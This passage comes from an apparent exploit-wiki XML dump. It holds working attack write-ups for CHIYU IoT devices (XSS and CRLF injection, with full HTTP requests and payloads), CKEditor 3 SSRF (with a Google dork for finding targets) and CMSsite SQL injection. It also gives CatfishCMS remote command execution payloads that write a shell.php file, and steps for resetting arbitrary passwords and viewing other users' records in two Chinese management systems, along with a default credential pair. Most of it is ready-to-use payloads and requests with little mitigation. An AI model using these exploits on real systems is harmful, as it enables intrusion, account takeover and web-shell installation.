Affected parameter: TF_port=Component: man.cgi
Payload: /"&gt;&lt;img src="#"&gt;

GET
/man.cgi?redirect=setting.htm&amp;failure=fail.htm&amp;type=dev_name_apply&amp;http_block=0&amp;TF_ip0=192&amp;TF_ip1=168&amp;TF_ip2=200&amp;TF_ip3=200&amp;TF_port=%22%3E%3Cimg+src%3D%22%23%22%3E&amp;TF_port=%22%3E%3Cimg+src%3D%22%23%22%3E&amp;B_mac_apply=APPLY
HTTP/1.1
Host: 192.168.187.12
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.187.12/manage.htm
Authorization: Basic OmFkbWlu
Connection: close
Upgrade-Insecure-Requests: 1


Steps to reproduce:
  1. Navigate to the vulnerable device
  2. Make a GET request to component mentioned (man.cgi)
  3. Append the payload at the end of the vulnerable parameter (TF_port)
  4. Submit the request and observe payload execution



#2:  Unauthenticated XSS in several CHIYU IoT devices
CVE ID: CVE-2021-31641
Medium - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N
URL: https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31641


Component: any argument passed via URL that results in an HTTP-404
Payload: http://ip/&lt;script&gt;alert(123)&lt;/script&gt;


Steps to reproduce:
  1. Navigate to the webpage of the vulnerable device
  2. On the web-browsers, you need to append the payload after the IP
address (see payload above)
  3. Submit the request and observe payload execution


#3:  Stored XSS in CHIYU SEMAC, BF-630, BF-631, and Webpass IoT devices
CVE ID: CVE-2021-31643
Medium - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N
URL: https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31643

Affected parameter: username=
Component: if.cgi
Payload: "&gt;&lt;script&gt;alert(1)&lt;/script&gt;

HTTP request - SEMAC Web Ver7.2

GET
/if.cgi?redirect=EmpRcd.htm&amp;failure=fail.htm&amp;type=user_data&amp;creg=0&amp;num=&amp;EmployeeID=0000&amp;MarkID=0000&amp;CardID=000000&amp;username=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;Card_Valid=0&amp;SY=2021&amp;SM=2&amp;SD=7&amp;sy_h=16&amp;sy_m=23&amp;EY=2021&amp;EM=2&amp;ED=7&amp;sy_h=16&amp;sy_m=23&amp;Activate=5&amp;Usertype=0&amp;group_list1=1&amp;group_list2=0&amp;group_list3=0&amp;group_list4=0&amp;Verify=1&amp;Password=&amp;Retype=&amp;card=0&amp;card=0&amp;card=0&amp;card=0&amp;card=0&amp;card=116&amp;card=9&amp;card=138
HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0)
Gecko/20100101 Firefox/87.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Referer: http://127.0.0.1/EmpRcd.htm
Cookie: fresh=; remote=00000000
Upgrade-Insecure-Requests: 1


HTTP request - BIOSENSE-III-COMBO(M1)(20000)

GET
/if.cgi?redirect=EmpRcd.htm&amp;failure=fail.htm&amp;type=user_data&amp;creg=0&amp;num=&amp;EmployeeID=3&amp;MarkID=3474&amp;CardID=00000000&amp;emp_id=&amp;username=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;Card_Valid=0&amp;SY=2019&amp;SM=11&amp;SD=25&amp;sy_h=15&amp;sy_m=0&amp;EY=2019&amp;EM=11&amp;ED=25&amp;sy_h=15&amp;sy_m=0&amp;Activate=5&amp;Usertype=0&amp;group_list1=1&amp;group_list2=0&amp;group_list3=0&amp;group_list4=0&amp;Verify=1&amp;Password=&amp;Retype=&amp;card=0&amp;card=0&amp;card=0&amp;card=0&amp;card=118&amp;card=5&amp;card=101&amp;card=110
HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0)
Gecko/20100101 Firefox/87.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Referer: http://127.0.0.1/EmpRcd.htm
Cookie: fresh=
Upgrade-Insecure-Requests: 1


Steps to reproduce:
  1. Navigate to the vulnerable device
  2. Make a GET request to component mentioned (if.cgi)
  3. Append the payload at the end of the vulnerable parameter (username)
  4. Submit the request and observe payload execution
&lt;/pre&gt;</text>
      <sha1>0ix3fqvpifsh0dyuefv64uatt2u57x6</sha1>
    </revision>
  </page>
  <page>
    <title>CHIYU TCP/IP Converter devices CLRF注入漏洞</title>
    <ns>0</ns>
    <id>3329</id>
    <revision>
      <id>3887</id>
      <timestamp>2021-06-02T01:13:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: CHIYU TCP/IP Converter devices - CRLF injection # Date: May 31 2021 # Exploit Author: sirpedrotavares # Vendor Homepage: https://www.chiyu-tech...."</comment>
      <origin>3887</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2153" sha1="93jpl6b3kr3prynl1ah78683bfea7mo" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: CHIYU TCP/IP Converter devices - CRLF injection
# Date: May 31 2021
# Exploit Author: sirpedrotavares
# Vendor Homepage: https://www.chiyu-tech.com/msg/msg88.html
# Software Link: https://www.chiyu-tech.com/category-hardware.html
# Version:  BF-430, BF-431, and BF-450M TCP/IP Converter devices   - all firmware versions &lt; June 2021
# Tested on:  BF-430, BF-431, and BF-450M
# Publication: https://seguranca-informatica.pt/dancing-in-the-iot-chiyu-devices-vulnerable-to-remote-attacks

Description: A CRLF injection vulnerability was found on BF-430, BF-431, and BF-450M TCP/IP Converter devices from CHIYU Technology Inc due to a lack of validation on the parameter redirect= available on multiple CGI components.
CVSS: Medium – CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N
URL: https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31249

Affected parameter: redirect=Component: all the CGI components
Payload: %0d%0a%0d%0a&lt;script&gt;alert(document.domain)&lt;/script&gt;

====HTTP request======
GET
/man.cgi?redirect=setting.htm%0d%0a%0d%0a&lt;script&gt;alert(document.domain)&lt;/script&gt;&amp;failure=fail.htm&amp;type=dev_name_apply&amp;http_block=0&amp;TF_ip0=192&amp;TF_ip1=168&amp;TF_ip2=200&amp;TF_ip3=200&amp;TF_port=&amp;TF_port=&amp;B_mac_apply=APPLY
HTTP/1.1
Host: 192.168.187.12
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.187.12/manage.htm
Authorization: Basic OmFkbWlu
Connection: close
Upgrade-Insecure-Requests: 1

======HTTP response========
HTTP/1.1 302 Found
Location: setting.htm
&lt;script&gt;alert(document.domain)&lt;/script&gt;
Content-Length: 0
Content-Type: text/html


Steps to reproduce:
  1. Navigate to the vulnerable device
  2. Make a GET request to all CGI components
  3. Append the payload at the end of the vulnerable parameter (redirect )
  4. Submit the request and observe payload execution


 Mitigation: The latest version of the CHIYU firmware should be installed
to mitigate this vulnerability.
            
&lt;/pre&gt;</text>
      <sha1>93jpl6b3kr3prynl1ah78683bfea7mo</sha1>
    </revision>
  </page>
  <page>
    <title>CKEditor 3 SSRF漏洞</title>
    <ns>0</ns>
    <id>4521</id>
    <revision>
      <id>5203</id>
      <timestamp>2021-06-17T00:43:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: CKEditor 3 - Server-Side Request Forgery (SSRF) # Google Dorks : inurl /editor/filemanager/connectors/uploadtest.html # Date: 12-6-2021 # Exploit Author..."</comment>
      <origin>5203</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1589" sha1="1sbtojlqguy0nzu7xgrlurre23hljw7" xml:space="preserve">&lt;pre&gt;
# Exploit Title: CKEditor 3 - Server-Side Request Forgery (SSRF)
# Google Dorks : inurl /editor/filemanager/connectors/uploadtest.html
# Date: 12-6-2021
# Exploit Author: Blackangel
# Software Link: https://ckeditor.com/
# Version:all version under 4 (1,2,3)
# Tested on: windows 7

Steps of Exploit:-

1-using google dorks

inurl /editor/filemanager/connectors/uploadtest.html

2-after going to vulnerable page you will find filed “Custom Uploader URL: ”

3-right click then choose inspect element, click on pick an element from
the page , select field Custom Uploader URL:

4-in elements “&lt;input id=”txtCustomUrl” style=”WIDTH: 100%;
BACKGROUND-COLOR: #dcdcdc” disabled=”” type=”text”&gt;”

delete disabled=””

5-now you can put url start with any protocal

6-send it to the server as you see website that you have entered link

is appear into page .

what this mean??!!1

you send request to server using vulnerable website

you can said i used it as proxy

hackers &gt;&gt;&gt; vulnerable website &gt;&gt;&gt; http:/xx.com

so in http://xx.com logs requests come from vulnerable website

impact:-

1-that allows an attacker to induce the server-side application to make
HTTP requests to an arbitrary domain of the attacker’s choosing. if there
is big company use old version hackers can send request via there websites
and this not good for reputation of company

2-put big company website in blacklist of websites cause i hackers can send
many of request via vulnerable website

Mitigation:-

Remove the uploadtest.html file as it is not used by the application.
&lt;/pre&gt;</text>
      <sha1>1sbtojlqguy0nzu7xgrlurre23hljw7</sha1>
    </revision>
  </page>
  <page>
    <title>CMSimple 5.2 XSS漏洞</title>
    <ns>0</ns>
    <id>976</id>
    <revision>
      <id>1250</id>
      <timestamp>2021-04-08T08:10:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== # Exploit Title: CMSimple 5.2 - 'External' Stored XSS # Date: 2021/04/07 # Exploit Author: Quadron Research Lab # Version: CMSimple 5.2 # Tested on: Windows 10 x64 HU..."</comment>
      <origin>1250</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="663" sha1="bnd721h6dqcp0o40wzyjxxf4s8f56ho" xml:space="preserve">==INFO==
# Exploit Title: CMSimple 5.2 - 'External' Stored XSS
# Date: 2021/04/07
# Exploit Author: Quadron Research Lab
# Version: CMSimple 5.2
# Tested on: Windows 10 x64 HUN/ENG Professional
# Vendor: https://www.cmsimple.org/en/

[Description]
The CMSimple 5.2 allow stored XSS via the Settings &gt; CMS &gt; Filebrowser &gt; "External:" input field.

[Attack Vectors]
The CMSimple cms "Filebrowser" "External:" input field not filter special chars. It is possible to place JavaScript code. 
The JavaScript code placed here is executed by clicking on the Page or Files tab.

[Proof of Concept]
https://github.com/Quadron-Research-Lab/CVE/blob/main/CMSimple_5.2_XSS.pdf</text>
      <sha1>bnd721h6dqcp0o40wzyjxxf4s8f56ho</sha1>
    </revision>
  </page>
  <page>
    <title>CMSsite 1.0 - 'post' SQL注入漏洞</title>
    <ns>0</ns>
    <id>1638</id>
    <revision>
      <id>2042</id>
      <timestamp>2021-05-02T05:05:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: CMSsite 1.0 - 'post' SQL Injection  # Exploit Author: Mr Winst0n # Author E-mail: manamtabeshekan[@]gmail[.]com # Discovery Date: February 17, 2..."</comment>
      <origin>2042</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="684" sha1="3j12bc7gka94qklwyhlbracj44wr2i2" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: CMSsite 1.0 - 'post' SQL Injection

# Exploit Author: Mr Winst0n
# Author E-mail: manamtabeshekan[@]gmail[.]com
# Discovery Date: February 17, 2019
# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
# Software Link : https://github.com/VictorAlagwu/CMSsite/archive/master.zip
# Tested Version: 1.0
# Tested on: Kali linux, Windows 8.1 


# PoC:
# Vulnerable File: post.php
# Vulnerable Parameter : post

if (isset($_GET['post'])) {
	$post = $_GET['post'];
}
$query = "SELECT * FROM posts WHERE post_id=$post";
$run_query = mysqli_query($con, $query);



# Payload: http://localhost/CMSsite/post.php?post=1%20and%20(sleep(10))
            
&lt;/pre&gt;</text>
      <sha1>3j12bc7gka94qklwyhlbracj44wr2i2</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2019-06255 CatfishCMS遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>4285</id>
    <revision>
      <id>4927</id>
      <timestamp>2021-06-12T13:10:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; v4.8.54  ==Payload== &lt;pre&gt; s=dir&amp;_method=__construct&amp;method=*&amp;filter[]=system &lt;/pre&gt;  &lt;pre&gt; s=echo "shell" &gt;shell.php&amp;f..."</comment>
      <origin>4927</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="225" sha1="7lo609jgokklj2z5zn2i0dtgofmkg23" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
v4.8.54

==Payload==
&lt;pre&gt;
s=dir&amp;_method=__construct&amp;method=*&amp;filter[]=system
&lt;/pre&gt;

&lt;pre&gt;
s=echo "shell" &gt;shell.php&amp;filter[]=system&amp;method=*&amp;_method=__construct
&lt;/pre&gt;</text>
      <sha1>7lo609jgokklj2z5zn2i0dtgofmkg23</sha1>
    </revision>
    <revision>
      <id>4929</id>
      <parentid>4927</parentid>
      <timestamp>2021-06-12T13:12:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4929</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="236" sha1="3yw1ar7hla1178f99dnt7rghpm1su8x" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
v4.8.54

==Payload==
&lt;pre&gt;
s=dir&amp;_method=__construct&amp;method=*&amp;filter[]=system
&lt;/pre&gt;

&lt;pre&gt;
s=echo "shell" &gt;shell.php&amp;filter[]=system&amp;method=*&amp;_method=__construct
&lt;/pre&gt;</text>
      <sha1>3yw1ar7hla1178f99dnt7rghpm1su8x</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2019-06255 CatfishCMS遠程命令執行漏洞/en</title>
    <ns>0</ns>
    <id>4445</id>
    <revision>
      <id>5119</id>
      <timestamp>2021-06-16T01:53:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CNVD-2019-06255 CatfishCMS remote command execution vulnerability"</comment>
      <origin>5119</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="208" sha1="498765xsn70zam1hiineyixqs6ihju5" xml:space="preserve">&lt;languages /&gt;
==Vulnerability Impact==
v4.8.54

==Payload==
&lt;pre&gt;
s=dir&amp;_method=__construct&amp;method=*&amp;filter[]=system
&lt;/pre&gt;

&lt;pre&gt;
s=echo "shell" &gt;shell.php&amp;filter[]=system&amp;method=*&amp;_method=__construct
&lt;/pre&gt;</text>
      <sha1>498765xsn70zam1hiineyixqs6ihju5</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2019-06255 CatfishCMS遠程命令執行漏洞/es</title>
    <ns>0</ns>
    <id>4578</id>
    <revision>
      <id>5266</id>
      <timestamp>2021-06-17T01:18:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CNVD-2019-06255 Vulnerabilidad de ejecución remota de comandos de CatfishCMS"</comment>
      <origin>5266</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="218" sha1="ii35rpc0afpwbqxykabq4b9ev30o9p6" xml:space="preserve">&lt;languages /&gt;
== Impacto de la vulnerabilidad ==
v4.8.54

==Payload==
&lt;pre&gt;
s=dir&amp;_method=__construct&amp;method=*&amp;filter[]=system
&lt;/pre&gt;

&lt;pre&gt;
s=echo "shell" &gt;shell.php&amp;filter[]=system&amp;method=*&amp;_method=__construct
&lt;/pre&gt;</text>
      <sha1>ii35rpc0afpwbqxykabq4b9ev30o9p6</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2019-06255 CatfishCMS遠程命令執行漏洞/ru</title>
    <ns>0</ns>
    <id>4444</id>
    <revision>
      <id>5118</id>
      <timestamp>2021-06-16T01:53:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CNVD-2019-06255 CatfishCMS уязвимость удаленного выполнения команд"</comment>
      <origin>5118</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="233" sha1="skncqlev1khf4z6nb509wiqbuf424k5" xml:space="preserve">&lt;languages /&gt;
== Воздействие уязвимости ==
v4.8.54

==Payload==
&lt;pre&gt;
s=dir&amp;_method=__construct&amp;method=*&amp;filter[]=system
&lt;/pre&gt;

&lt;pre&gt;
s=echo "shell" &gt;shell.php&amp;filter[]=system&amp;method=*&amp;_method=__construct
&lt;/pre&gt;</text>
      <sha1>skncqlev1khf4z6nb509wiqbuf424k5</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2019-06255 CatfishCMS遠程命令執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4291</id>
    <revision>
      <id>4934</id>
      <timestamp>2021-06-12T13:13:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CatfishCMS远程命令执行漏洞"</comment>
      <origin>4934</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="200" sha1="5bs49h5ofunmfsjuvtd3ui56gol0mcm" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
v4.8.54

==Payload==
&lt;pre&gt;
s=dir&amp;_method=__construct&amp;method=*&amp;filter[]=system
&lt;/pre&gt;

&lt;pre&gt;
s=echo "shell" &gt;shell.php&amp;filter[]=system&amp;method=*&amp;_method=__construct
&lt;/pre&gt;</text>
      <sha1>5bs49h5ofunmfsjuvtd3ui56gol0mcm</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2019-06255 CatfishCMS遠程命令執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>6081</id>
    <revision>
      <id>6951</id>
      <timestamp>2021-07-10T07:49:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響=="</comment>
      <origin>6951</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="200" sha1="tojj4fc550ur6yhav34fvd9rf8hssy6" xml:space="preserve">&lt;languages /&gt;
==漏洞影響==
v4.8.54

==Payload==
&lt;pre&gt;
s=dir&amp;_method=__construct&amp;method=*&amp;filter[]=system
&lt;/pre&gt;

&lt;pre&gt;
s=echo "shell" &gt;shell.php&amp;filter[]=system&amp;method=*&amp;_method=__construct
&lt;/pre&gt;</text>
      <sha1>tojj4fc550ur6yhav34fvd9rf8hssy6</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2019-06255 CatfishCMS遠程命令執行漏洞/zh-tw</title>
    <ns>0</ns>
    <id>6107</id>
    <revision>
      <id>6977</id>
      <timestamp>2021-07-10T09:14:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響=="</comment>
      <origin>6977</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="200" sha1="tojj4fc550ur6yhav34fvd9rf8hssy6" xml:space="preserve">&lt;languages /&gt;
==漏洞影響==
v4.8.54

==Payload==
&lt;pre&gt;
s=dir&amp;_method=__construct&amp;method=*&amp;filter[]=system
&lt;/pre&gt;

&lt;pre&gt;
s=echo "shell" &gt;shell.php&amp;filter[]=system&amp;method=*&amp;_method=__construct
&lt;/pre&gt;</text>
      <sha1>tojj4fc550ur6yhav34fvd9rf8hssy6</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-10526 南京南軟科技有限公司 研究生管理信息系統 任意密碼修改漏洞</title>
    <ns>0</ns>
    <id>5704</id>
    <revision>
      <id>6555</id>
      <timestamp>2021-07-08T13:29:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞利用== &lt;/translate&gt; &lt;pre&gt; https://&lt;target&gt;/pyxx/grgl/xsmmxg.aspx &lt;/pre&gt; &lt;translate&gt; 修改學號爲需要重置帳號密碼的帳號，保..."</comment>
      <origin>6555</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="199" sha1="0jufjdw3n5nwplspcwmkgacg4rdndkk" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/pyxx/grgl/xsmmxg.aspx
&lt;/pre&gt;
&lt;translate&gt;
修改學號爲需要重置帳號密碼的帳號，保存即可。
&lt;/translate&gt;</text>
      <sha1>0jufjdw3n5nwplspcwmkgacg4rdndkk</sha1>
    </revision>
    <revision>
      <id>6556</id>
      <parentid>6555</parentid>
      <timestamp>2021-07-08T13:30:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6556</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="221" sha1="9z8sckrnxgv9ay4w52406r8w2gs6txs" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞利用== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/pyxx/grgl/xsmmxg.aspx
&lt;/pre&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
修改學號爲需要重置帳號密碼的帳號，保存即可。
&lt;/translate&gt;</text>
      <sha1>9z8sckrnxgv9ay4w52406r8w2gs6txs</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-10526 南京南軟科技有限公司 研究生管理信息系統 任意密碼修改漏洞/zh-hant</title>
    <ns>0</ns>
    <id>5784</id>
    <revision>
      <id>6653</id>
      <timestamp>2021-07-10T07:20:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "修改學號爲需要重置帳號密碼的帳號，保存即可。"</comment>
      <origin>6653</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="149" sha1="o9acb0pkjbti84242mlwor7njsvh09k" xml:space="preserve">&lt;languages /&gt;
==漏洞利用==
&lt;pre&gt;
https://&lt;target&gt;/pyxx/grgl/xsmmxg.aspx
&lt;/pre&gt;
修改學號爲需要重置帳號密碼的帳號，保存即可。</text>
      <sha1>o9acb0pkjbti84242mlwor7njsvh09k</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-10530 深圳市科皓信息技術有限公司 測站綜合管理平台 邏輯缺陷漏洞</title>
    <ns>0</ns>
    <id>5718</id>
    <revision>
      <id>6572</id>
      <timestamp>2021-07-08T13:39:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==前提條件== &lt;/translate&gt; &lt;translate&gt; 該漏洞需要普通用戶身份登錄平台，登錄平台後可以以普通用戶的權限重置所有..."</comment>
      <origin>6572</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="730" sha1="fb1i1zip7822ot4g5thfd548ppv9hlj" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==前提條件==
&lt;/translate&gt;
&lt;translate&gt;
該漏洞需要普通用戶身份登錄平台，登錄平台後可以以普通用戶的權限重置所有用戶（包括管理員）的密碼。
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/dpc/
&lt;/pre&gt;

&lt;translate&gt;
==默認用戶信息==
&lt;/translate&gt;
&lt;pre&gt;
cs
cs123456
&lt;/pre&gt;


&lt;translate&gt;
==重置Admin密碼==
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/dpc/dpcUser!preEdit.action?dpcUser.id=1
&lt;/pre&gt;

&lt;translate&gt;
修改dpcUser.id參數的值可以編輯任意用戶，其中可以對任意用戶進行重置密碼，如：
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/dpc/dpcUser!preEdit.action?dpcUser.id=2
&lt;/pre&gt;

&lt;pre&gt;
https://&lt;target&gt;/dpc/dpcUser!preEdit.action?dpcUser.id=3
&lt;/pre&gt;</text>
      <sha1>fb1i1zip7822ot4g5thfd548ppv9hlj</sha1>
    </revision>
    <revision>
      <id>6573</id>
      <parentid>6572</parentid>
      <timestamp>2021-07-08T13:39:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6573</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="785" sha1="2ed3z17npfq2o097fn792qsx547tyc1" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==前提條件== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
該漏洞需要普通用戶身份登錄平台，登錄平台後可以以普通用戶的權限重置所有用戶（包括管理員）的密碼。
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/dpc/
&lt;/pre&gt;

&lt;translate&gt;
==默認用戶信息== &lt;!--T:3--&gt;
&lt;/translate&gt;
&lt;pre&gt;
cs
cs123456
&lt;/pre&gt;


&lt;translate&gt;
==重置Admin密碼== &lt;!--T:4--&gt;
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/dpc/dpcUser!preEdit.action?dpcUser.id=1
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:5--&gt;
修改dpcUser.id參數的值可以編輯任意用戶，其中可以對任意用戶進行重置密碼，如：
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/dpc/dpcUser!preEdit.action?dpcUser.id=2
&lt;/pre&gt;

&lt;pre&gt;
https://&lt;target&gt;/dpc/dpcUser!preEdit.action?dpcUser.id=3
&lt;/pre&gt;</text>
      <sha1>2ed3z17npfq2o097fn792qsx547tyc1</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-21993 南京南軟科技有限公司 研究生管理信息系統 邏輯缺陷漏洞</title>
    <ns>0</ns>
    <id>5708</id>
    <revision>
      <id>6560</id>
      <timestamp>2021-07-08T13:32:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 登入系統 &lt;/translate&gt; &lt;pre&gt; https://&lt;target&gt;/gmis/login.aspx &lt;/pre&gt;  &lt;translate&gt; 查看學生信息（..."</comment>
      <origin>6560</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="288" sha1="30xrukbpk2jsh4kzmn8qhsqoevjrtaf" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
登入系統
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/gmis/login.aspx
&lt;/pre&gt;

&lt;translate&gt;
查看學生信息（XXXXXXXXX爲學號）
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/gmis/xjgl/student_info1.aspx?studentid=XXXXXXXXX
&lt;/pre&gt;</text>
      <sha1>30xrukbpk2jsh4kzmn8qhsqoevjrtaf</sha1>
    </revision>
    <revision>
      <id>6561</id>
      <parentid>6560</parentid>
      <timestamp>2021-07-08T13:33:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6561</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="321" sha1="8gfaluwkk59w8y9zdjbqshr63ia4an7" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞利用== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
登入系統
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/gmis/login.aspx
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
查看學生信息（XXXXXXXXX爲學號）
&lt;/translate&gt;
&lt;pre&gt;
https://&lt;target&gt;/gmis/xjgl/student_info1.aspx?studentid=XXXXXXXXX
&lt;/pre&gt;</text>
      <sha1>8gfaluwkk59w8y9zdjbqshr63ia4an7</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-58411 Misstar Tools 小米路由器 未授權訪問漏洞</title>
    <ns>0</ns>
    <id>5737</id>
    <revision>
      <id>6595</id>
